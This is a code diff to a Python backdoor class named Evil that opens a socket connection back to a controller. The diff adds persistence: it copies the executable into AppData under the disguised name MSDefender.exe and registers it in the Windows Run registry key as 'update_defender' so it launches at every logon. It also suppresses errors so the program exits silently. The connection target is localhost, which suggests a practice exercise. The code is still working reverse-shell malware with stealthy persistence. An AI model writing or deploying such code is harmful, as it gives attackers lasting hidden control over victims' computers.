@@ -10,9 +10,11 @@ import json
 import os
 import base64
 import sys
+import shutil
 
 class Evil:
     def __init__(self,ip,port):
+        self.persist()
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
         self.connection.send("\n[+] connection established.\n")
@@ -20,6 +22,13 @@ class Evil:
     def reliable_send(self, data):
         json_data = json.dumps(data)
         self.connection.send(json_data)
+
+
+    def persist(self):
+        hidden_path = os.environ["appdata"] + "\\MSDefender.exe"
+        if not os.path.exists(hidden_path):
+            shutil.copyfile(sys.executable, hidden_path)
+            subprocess.call('reg add HKCU\Software\Microsoft\windows\CurrentVersion\Run /v update_defender /t REG_SZ /d "'+hidden_path+'"',shell=True)
 
     def reliable_recv(self):
         json_data = ""
@@ -73,5 +82,8 @@ class Evil:
 
         self.connection.close()
 
-evil = Evil("127.0.0.1",2508)
-evil.run()
+try:
+    evil = Evil("127.0.0.1",2508)
+    evil.run()
+except Exception:
+    sys.exit()
